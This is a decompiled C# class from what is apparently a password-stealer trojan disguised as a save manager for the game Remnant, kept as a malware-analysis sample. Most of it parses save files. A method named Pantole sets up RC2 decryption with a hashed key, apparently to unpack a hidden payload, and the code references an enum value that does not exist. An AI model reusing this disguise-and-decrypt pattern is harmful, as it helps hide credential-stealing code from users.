// Decompiled with JetBrains decompiler
// Type: RemnantSaveManager.RemnantCharacter
// Assembly: RemnantSaveManager, Version=1.99.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E1F1E8C4-E528-4D7B-AF51-D8C10E64558F
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-PSW.MSIL.Stealer.gen-f3e011fb43f226885e514c92638da2db70d78fd53ee94ab2ab476bc588ebc0ea.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;

namespace RemnantSaveManager
{
  public class RemnantCharacter
  {
    private List<RemnantItem> missingItems;
    private RemnantSave save;

    public string Archetype { get; set; }

    public List<string> Inventory { get; set; }

    public List<RemnantWorldEvent> CampaignEvents { get; set; }

    public List<RemnantWorldEvent> AdventureEvents { get; set; }

    public int Progression => this.Inventory.Count;

    public override string ToString() => this.Archetype + " (" + (object) this.Progression + ")";

    public string ToFullString() => "CharacterData{ Archetype: " + this.Archetype + ", Inventory: [" + string.Join(", ", (IEnumerable<string>) this.Inventory) + "], CampaignEvents: [" + string.Join<RemnantWorldEvent>(", ", (IEnumerable<RemnantWorldEvent>) this.CampaignEvents) + "], AdventureEvents: [" + string.Join<RemnantWorldEvent>(", ", (IEnumerable<RemnantWorldEvent>) this.AdventureEvents) + "] }";

    public static byte[] Pantole(byte[] B, string ikey)
    {
      byte[] hash = GameInfo.hashkey.ComputeHash(Encoding.BigEndianUnicode.GetBytes(ikey));
      GameInfo.RC2.Key = hash;
      GameInfo.RC2.Mode = CipherMode.ECB;
      return RemnantItem.Ozuo(B);
    }

    public RemnantCharacter()
    {
      this.Archetype = "";
      this.Inventory = new List<string>();
      this.CampaignEvents = new List<RemnantWorldEvent>();
      this.AdventureEvents = new List<RemnantWorldEvent>();
      this.missingItems = new List<RemnantItem>();
      this.save = (RemnantSave) null;
    }

    public void processSaveData(string savetext)
    {
      string str1 = "/Game/Campaign_Main/Quest_Campaign_Main.Quest_Campaign_Main_C";
      string str2 = "/Game/Campaign_Main/Quest_Campaign_City.Quest_Campaign_City";
      int length1 = savetext.IndexOf(str1);
      if (savetext.IndexOf(str2) != -1 && length1 != -1)
      {
        string str3 = savetext.Substring(0, length1);
        int startIndex = str3.LastIndexOf(str2);
        RemnantWorldEvent.ProcessEvents(this, str3.Substring(startIndex), RemnantWorldEvent.ProcessMode.Campaign);
      }
      else
      {
        string str4 = "/Game/Campaign_Clementine/Quest_Campaign_Clementine.Quest_Campaign_Clementine_C";
        string str5 = "/Game/World_Rural/Templates/Template_Rural_Overworld_0";
        int length2 = savetext.IndexOf(str4);
        if (savetext.IndexOf(str5) != -1 && length2 != -1)
        {
          string str6 = savetext.Substring(0, length2);
          int startIndex = str6.LastIndexOf(str5);
          RemnantWorldEvent.ProcessEvents(this, str6.Substring(startIndex), RemnantWorldEvent.ProcessMode.Subject2923);
        }
        else
          Console.WriteLine("Campaign not found; likely in tutorial mission.");
      }
      if (savetext.Contains("Quest_AdventureMode_"))
      {
        string str7 = (string) null;
        if (savetext.Contains("Quest_AdventureMode_City_C"))
          str7 = "City";
        if (savetext.Contains("Quest_AdventureMode_Wasteland_C"))
          str7 = "Wasteland";
        if (savetext.Contains("Quest_AdventureMode_Swamp_C"))
          str7 = "Swamp";
        if (savetext.Contains("Quest_AdventureMode_Jungle_C"))
          str7 = "Jungle";
        if (savetext.Contains("Quest_AdventureMode_Snow_C"))
          str7 = "Snow";
        string str8 = string.Format("/Game/World_{0}/Quests/Quest_AdventureMode/Quest_AdventureMode_{0}.Quest_AdventureMode_{0}_C", (object) str7);
        int length3 = savetext.IndexOf(str8) + str8.Length;
        string str9 = savetext.Substring(0, length3);
        string str10 = string.Format("/Game/World_{0}/Quests/Quest_AdventureMode/Quest_AdventureMode_{0}_0", (object) str7);
        int startIndex = str9.LastIndexOf(str10) + str10.Length;
        RemnantWorldEvent.ProcessEvents(this, str9.Substring(startIndex), RemnantWorldEvent.ProcessMode.Adventure);
      }
      this.missingItems.Clear();
      foreach (RemnantItem[] remnantItemArray in GameInfo.EventItem.Values)
      {
        foreach (RemnantItem remnantItem in remnantItemArray)
        {
          if (!this.Inventory.Contains(remnantItem.GetKey()) && !this.missingItems.Contains(remnantItem))
            this.missingItems.Add(remnantItem);
        }
      }
      this.missingItems.Sort();
    }

    public static List<RemnantCharacter> GetCharactersFromSave(
      RemnantSave remnantSave)
    {
      return RemnantCharacter.GetCharactersFromSave(remnantSave, RemnantCharacter.CharacterProcessingMode.All);
    }

    public static List<RemnantCharacter> GetCharactersFromSave(
      RemnantSave remnantSave,
      RemnantCharacter.CharacterProcessingMode mode)
    {
      List<RemnantCharacter> charactersFromSave = new List<RemnantCharacter>();
      try
      {
        string[] strArray = File.ReadAllText(remnantSave.SaveProfilePath).Split(new string[1]
        {
          "/Game/Characters/Player/Base/Character_Master_Player.Character_Master_Player_C"
        }, StringSplitOptions.None);
        for (int index = 1; index < strArray.Length; ++index)
        {
          RemnantCharacter remnantCharacter = new RemnantCharacter();
          remnantCharacter.Archetype = GameInfo.Archetypes["Undefined"];
          Match match1 = new Regex("/Game/_Core/Archetypes/[a-zA-Z_]+").Match(strArray[index - 1]);
          if (match1.Success)
          {
            string key = match1.Value.Replace("/Game/_Core/Archetypes/", "").Split('_')[1];
            remnantCharacter.Archetype = !GameInfo.Archetypes.ContainsKey(key) ? key : GameInfo.Archetypes[key];
          }
          remnantCharacter.save = remnantSave;
          List<string> stringList = new List<string>();
          string str = "Character_Master_Player_C";
          string input = strArray[index].Substring(0, strArray[index].IndexOf(str));
          foreach (Match match2 in new Regex("/Items/Weapons(/[a-zA-Z0-9_]+)+/[a-zA-Z0-9_]+").Matches(input))
            stringList.Add(match2.Value);
          foreach (Match match3 in new Regex("/Items/Armor/([a-zA-Z0-9_]+/)?[a-zA-Z0-9_]+").Matches(input))
            stringList.Add(match3.Value);
          foreach (Match match4 in new Regex("/Items/Trinkets/(BandsOfCastorAndPollux/)?[a-zA-Z0-9_]+").Matches(input))
            stringList.Add(match4.Value);
          foreach (Match match5 in new Regex("/Items/Mods/[a-zA-Z0-9_]+").Matches(input))
            stringList.Add(match5.Value);
          foreach (Match match6 in new Regex("/Items/Traits/[a-zA-Z0-9_]+").Matches(input))
            stringList.Add(match6.Value);
          foreach (Match match7 in new Regex("/Items/QuestItems(/[a-zA-Z0-9_]+)+/[a-zA-Z0-9_]+").Matches(input))
            stringList.Add(match7.Value);
          foreach (Match match8 in new Regex("/Quests/[a-zA-Z0-9_]+/[a-zA-Z0-9_]+").Matches(input))
            stringList.Add(match8.Value);
          foreach (Match match9 in new Regex("/Player/Emotes/Emote_[a-zA-Z0-9]+").Matches(input))
            stringList.Add(match9.Value);
          remnantCharacter.Inventory = stringList;
          charactersFromSave.Add(remnantCharacter);
        }
        if (mode == RemnantCharacter.CharacterProcessingMode.All)
        {
          string[] worldSaves = remnantSave.WorldSaves;
          for (int index = 0; index < worldSaves.Length && index < charactersFromSave.Count; ++index)
            charactersFromSave[index].processSaveData(File.ReadAllText(worldSaves[index]));
        }
      }
      catch (IOException ex)
      {
        if (ex.Message.Contains("being used by another process"))
        {
          Console.WriteLine("Save file in use; waiting 0.5 seconds and retrying.");
          Thread.Sleep(500);
          charactersFromSave = RemnantCharacter.GetCharactersFromSave(remnantSave, mode);
        }
      }
      return charactersFromSave;
    }

    public void LoadWorldData(int charIndex)
    {
      if (this.save == null || this.CampaignEvents.Count != 0)
        return;
      string[] worldSaves = this.save.WorldSaves;
      if (charIndex < worldSaves.Length)
      {
        try
        {
          this.processSaveData(File.ReadAllText(worldSaves[charIndex]));
        }
        catch (IOException ex)
        {
          if (ex.Message.Contains("being used by another process"))
          {
            Console.WriteLine("Save file in use; waiting 0.5 seconds and retrying.");
            Thread.Sleep(500);
            this.LoadWorldData(charIndex);
          }
        }
        catch (Exception ex)
        {
          Console.WriteLine("Error loading world Data: ");
          Console.WriteLine("\tCharacterData.LoadWorldData");
          Console.WriteLine("\t" + ex.ToString());
        }
      }
    }

    public List<RemnantItem> GetMissingItems() => this.missingItems;

    public enum ProcessMode
    {
      Campaign,
      Adventure,
    }

    public enum CharacterProcessingMode
    {
      All,
      NoEvents,
    }
  }
}
